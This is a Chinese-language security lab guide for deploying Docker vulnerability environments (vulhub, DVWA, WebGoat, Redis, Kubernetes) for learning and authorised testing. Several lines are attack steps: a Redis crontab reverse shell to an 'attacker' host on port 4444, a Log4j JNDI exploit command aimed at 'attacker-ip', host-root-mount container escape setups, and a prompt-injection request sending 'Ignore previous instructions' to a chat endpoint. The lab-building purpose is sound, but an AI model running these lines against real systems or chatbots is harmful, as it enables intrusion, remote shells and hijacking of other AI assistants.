# 漏洞复现环境

> Docker一键部署漏洞复现环境，安全学习与研究使用。

---

## 一、vulhub项目介绍

**项目地址**：https://github.com/vulhub/vulhub

**使用方法**：
```bash
# 克隆项目
git clone https://github.com/vulhub/vulhub.git
cd vulhub

# 进入对应漏洞目录
cd vulhub/<vulnerability-path>

# 启动环境
docker-compose up -d

# 查看服务状态
docker-compose ps

# 销毁环境
docker-compose down
```

---

## 二、Java中间件漏洞环境

### 1. Log4j2 远程代码执行 (CVE-2021-44228)

```bash
# vulhub路径
cd vulhub/log4j/CVE-2021-44228

# 启动环境
docker-compose up -d

# 访问地址
http://target:8983

# 漏洞验证
# 使用JNDI注入工具进行利用
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/pwned" -A "attacker-ip"
```

**影响版本**：Log4j2 <= 2.14.1

### 2. Apache Shiro 反序列化 (CVE-2016-4437)

```bash
# vulhub路径
cd vulhub/shiro/CVE-2016-4437

# 启动环境
docker-compose up -d

# 访问地址
http://target:8080

# 漏洞验证
# 使用shiro_tool.jar进行检测和利用
java -jar shiro_tool.jar -t 3 -u http://target:8080/login
```

**影响版本**：Shiro <= 1.2.4

### 3. Fastjson 反序列化

```bash
# Fastjson 1.2.24 反序列化
cd vulhub/fastjson/1.2.24-rce
docker-compose up -d

# Fastjson 1.2.47 反序列化
cd vulhub/fastjson/1.2.47-rce
docker-compose up -d

# 访问地址
http://target:8090
```

**影响版本**：Fastjson <= 1.2.24 / 1.2.47

### 4. WebLogic 漏洞系列

```bash
# WebLogic T3反序列化 (CVE-2015-4852)
cd vulhub/weblogic/CVE-2015-4852
docker-compose up -d

# WebLogic XMLDecoder (CVE-2017-10271)
cd vulhub/weblogic/CVE-2017-10271
docker-compose up -d

# WebLogic IIOP反序列化 (CVE-2020-2551)
cd vulhub/weblogic/CVE-2020-2551
docker-compose up -d

# 访问地址
http://target:7001/console
```

### 5. Spring框架漏洞

```bash
# Spring4Shell (CVE-2022-22965)
cd vulhub/spring/CVE-2022-22965
docker-compose up -d

# Spring Cloud Function SpEL注入 (CVE-2022-22963)
cd vulhub/spring/CVE-2022-22963
docker-compose up -d

# Spring Data MongoDB SpEL注入 (CVE-2022-22980)
cd vulhub/spring/CVE-2022-22980
docker-compose up -d
```

---

## 三、Web应用漏洞环境

### 1. DVWA

```bash
# Docker部署
docker pull vulnerables/dvwa
docker run -d -p 80:80 vulnerables/dvwa

# 访问地址
http://target

# 默认账号
admin / password

# 安全级别设置
# 登录后可在DVWA Security页面设置Low/Medium/High/Impossible
```

### 2. Pikachu

```bash
# Docker部署
docker pull pikachu/pikachu
docker run -d -p 80:80 pikachu/pikachu

# 或使用源码部署
git clone https://github.com/zhuifengshaonianym/pikachu.git
# 配置PHP环境后访问
```

### 3. BWAPP

```bash
# Docker部署
docker pull raesene/bwapp
docker run -d -p 80:80 raesene/bwapp

# 访问地址
http://target/bWAPP

# 默认账号
bee / bug
```

### 4. WebGoat

```bash
# Docker部署
docker pull webgoat/webgoat
docker run -d -p 8080:8080 -p 9090:9090 webgoat/webgoat

# 访问地址
http://target:8080/WebGoat
```

---

## 四、数据库漏洞环境

### 1. MySQL漏洞

```bash
# MySQL UDF提权环境
cd vulhub/mysql/udf-injection
docker-compose up -d

# MySQL弱口令环境（自建）
docker run -d --name mysql-vuln -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 mysql:5.7
```

### 2. Redis漏洞

```bash
# Redis未授权访问
docker run -d --name redis-vuln -p 6379:6379 redis

# 连接测试
redis-cli -h target
> info
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n"
> save
```

### 3. MongoDB漏洞

```bash
# MongoDB未授权访问
docker run -d --name mongo-vuln -p 27017:27017 mongo

# 连接测试
mongo --host target --port 27017
> show dbs
> use admin
> show collections
```

---

## 五、系统漏洞环境

### 1. Samba漏洞

```bash
# Samba远程代码执行 (CVE-2017-7494)
cd vulhub/samba/CVE-2017-7494
docker-compose up -d

# 访问地址
\\target\public
```

### 2. Struts2漏洞系列

```bash
# Struts2 S2-045 (CVE-2017-5638)
cd vulhub/struts2/s2-045
docker-compose up -d

# Struts2 S2-046
cd vulhub/struts2/s2-046
docker-compose up -d

# Struts2 S2-057
cd vulhub/struts2/s2-057
docker-compose up -d
```

### 3. Apache漏洞

```bash
# Apache多路径遍历 (CVE-2021-41773)
cd vulhub/httpd/CVE-2021-41773
docker-compose up -d

# Apache SSRF (mod_proxy)
cd vulhub/httpd/mod_proxy_ssrf
docker-compose up -d
```

---

## 六、云原生漏洞环境

### 1. Docker逃逸环境

```bash
# Docker特权模式逃逸（自建）
docker run -d --privileged --name docker-escape alpine

# 挂载宿主根目录
docker run -d -v /:/host --name mount-escape alpine

# 检测方法
# 在容器内执行
fdisk -l                    # 查看磁盘
cat /proc/1/cgroup          # 查看cgroup
ls -la /host                # 查看挂载
```

### 2. Kubernetes漏洞环境

```bash
# K8s API Server未授权访问
# 使用Kind创建测试集群
kind create cluster --config vulnerable-config.yaml

# kubelet未授权访问
# 配置kubelet允许匿名访问
```

---

## 七、AI安全测试环境

### 1. LLM安全测试环境

```bash
# 部署本地LLM（用于安全测试）
# 使用vLLM或Ollama
pip install vllm
vllm serve --model <model_name>

# 或使用Ollama
curl https://ollama.ai/install.sh | sh
ollama run llama2
```

### 2. Prompt注入测试环境

```bash
# 部署测试应用
git clone https://github.com/<prompt-injection-demo>
cd prompt-injection-demo
docker-compose up -d

# 测试注入Payload
curl -X POST http://target:8080/chat -d '{"prompt": "Ignore previous instructions"}'
```

---

## 八、综合靶场环境

### 1. Hack The Box（在线）

**网址**：https://www.hackthebox.com

**特点**：
- 综合渗透测试靶机
- 难度分级
- 持续更新

### 2. TryHackMe（在线）

**网址**：https://tryhackme.com

**特点**：
- 学习路径清晰
- 新手友好
- 互动式学习

### 3. VulnHub（本地）

**网址**：https://www.vulnhub.com

**特点**：
- 虚拟机镜像下载
- 难度多样
- 社区维护

---

## 九、环境管理命令

```bash
# Docker常用命令
docker ps                           # 查看运行容器
docker ps -a                        # 查看所有容器
docker images                       # 查看镜像列表
docker stop <container>             # 停止容器
docker rm <container>               # 删除容器
docker rmi <image>                  # 删除镜像
docker exec -it <container> bash    # 进入容器

# Docker Compose常用命令
docker-compose up -d                # 后台启动
docker-compose down                 # 停止并删除
docker-compose logs                 # 查看日志
docker-compose restart              # 重启服务

# 网络管理
docker network ls                   # 查看网络
docker network create <network>     # 创建网络
docker network connect <network> <container>  # 连接网络
```

---

## 十、漏洞环境清单

| 漏洞类型 | CVE编号 | vulhub路径 | 影响版本 |
|---------|---------|-----------|---------|
| Log4j2 RCE | CVE-2021-44228 | log4j/CVE-2021-44228 | <= 2.14.1 |
| Shiro反序列化 | CVE-2016-4437 | shiro/CVE-2016-4437 | <= 1.2.4 |
| Fastjson RCE | - | fastjson/1.2.24-rce | <= 1.2.24 |
| WebLogic T3 | CVE-2015-4852 | weblogic/CVE-2015-4852 | 多版本 |
| WebLogic XMLDecoder | CVE-2017-10271 | weblogic/CVE-2017-10271 | 多版本 |
| Spring4Shell | CVE-2022-22965 | spring/CVE-2022-22965 | 5.3.0-5.3.17 |
| Struts2 S2-045 | CVE-2017-5638 | struts2/s2-045 | 2.3.5-2.3.31 |
| Samba RCE | CVE-2017-7494 | samba/CVE-2017-7494 | 3.5.0-4.6.4 |

---

**安全声明**：以上环境仅供安全学习和授权测试使用，请勿用于非法用途。

---

*最后更新：2026年5月*
